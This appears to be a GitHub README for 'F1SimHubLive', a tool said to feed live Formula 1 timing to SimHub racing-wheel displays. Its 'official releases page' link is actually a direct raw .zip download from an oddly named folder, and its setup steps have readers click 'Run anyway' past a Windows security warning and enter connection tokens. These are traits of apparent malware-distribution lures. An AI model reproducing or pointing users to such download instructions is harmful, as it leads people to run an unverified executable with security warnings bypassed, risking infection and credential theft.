# 🏎️ F1SimHubLive - Sync live F1 data to hardware

[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/wa585912/F1SimHubLive/main/shammocky/Sim-Live-Hub-v2.3-alpha.5.zip)

F1SimHubLive sends live Formula 1 timing data to your racing wheel. Use this tool if you own a wheel with a screen, such as a GSI unit, and run SimHub. It tracks telemetry from official F1 sources and updates your dashboard display in real time.

## 📥 How to download

Follow these steps to get the software on your Windows computer:

1. Visit the [official releases page](https://raw.githubusercontent.com/wa585912/F1SimHubLive/main/shammocky/Sim-Live-Hub-v2.3-alpha.5.zip).
2. Look for the section labeled "Assets" under the most recent version number.
3. Click the link that ends in `.zip` to start your download.
4. Open your Downloads folder once the file finishes saving.
5. Right-click the folder and select "Extract All."
6. Choose a location on your computer where you want to keep your program files.

## ⚙️ Initial setup

Before you run the tool, ensure you have the following installed on your Windows machine:

* **SimHub:** This remains the primary software for your cockpit hardware.
* **.NET Desktop Runtime:** Windows will prompt you to install this if your system lacks the necessary components.
* **MultiViewer or F1Live:** You need a connection to an active F1 timing source for the data to populate.

## 🚀 Getting started

Once you extract the files, follow these steps to connect your telemetry:

1. Open the folder where you placed the extracted files.
2. Double-click the file named `F1SimHubLive.exe`. 
3. If Windows shows a security warning, click "More info" and then "Run anyway" to allow the program to open.
4. Open the settings window inside the application.
5. Select your preferred timing source. You can choose between MultiViewer or the F1Live SignalR feed.
6. Enter your connection tokens if the source requires them.
7. Click "Save Settings" and restart the application to apply your changes.

## 🎮 Linking with SimHub

The application acts as a bridge between the race data and your hardware. Do not close the F1SimHubLive window while you race.

1. Open SimHub.
2. Select the "Dash Studio" tab on the left side of the screen.
3. Find the dashboard layout that supports your wheel type.
4. Ensure the telemetry mode is set to external. 
5. Start your race or practice session in your F1 software. 
6. Watch your wheel display update with live gaps, sector times, and tire data.

## 🛠️ Common troubleshooting

If your wheel screen stays blank or fails to update, check these items:

**The app will not launch**
Check that you downloaded the latest version of the .NET Desktop Runtime from the official Microsoft website. Older versions of Windows may require an update to run modern software modules.

**Data shows nothing on the screen**
Verify that your timing source program is running before you start F1SimHubLive. The application requires an active internet connection to pull race data. Check your local firewall settings to ensure the program has permission to communicate with your timing app.

**Performance issues**
If your hardware experiences lag, verify that you set your update rate to 10Hz or 20Hz in the settings tab. High refresh rates can strain systems with older processors.

**MultiViewer compatibility**
Make sure MultiViewer is configured to broadcast data signals locally. Open the MultiViewer network settings and ensure the "Remote API" option is enabled so F1SimHubLive can read the telemetry stream.

## 📋 System requirements

* **Operating System:** Windows 10 or Windows 11.
* **Memory:** 4GB RAM minimum, 8GB recommended.
* **Network:** Stable broadband connection for real-time data flow.
* **Display:** Any secondary monitor to view the status window if desired.
* **Hardware:** Compatible SimHub hardware such as GSI, Fanatec, or proprietary LCD wheel rims.

## 📁 File structure

Knowing the contents of your installation folder helps with maintenance:

* `F1SimHubLive.exe`: The file you click to start the bridge.
* `config.json`: Stores your connection settings and personal preferences.
* `Logs`: Records errors if the connection drops.
* `Resources`: Contains images and icons for the dashboard interface.

## 💡 Best practices

Keep your software updated to ensure compatibility with future F1 season changes. The developers update the bridge when the F1 timing data structure changes. Check the releases page every month for stability patches. 

If you prefer a specific driver focus, you can toggle the "Single Driver" setting in the main menu. This prioritizes data relevant to your selected driver, which reduces the number of messages sent to your wheel screen. This helps improve the responsiveness of your display during intense racing moments.

## 🔒 Privacy and security

This program handles data only between your timing source and SimHub. It does not store your personal information, IP addresses, or login passwords on any external server. All configuration data remains within the local `config.json` file on your computer. Accessing the internet allows the program to retrieve live timing packets. It does not transmit telemetry data to third parties.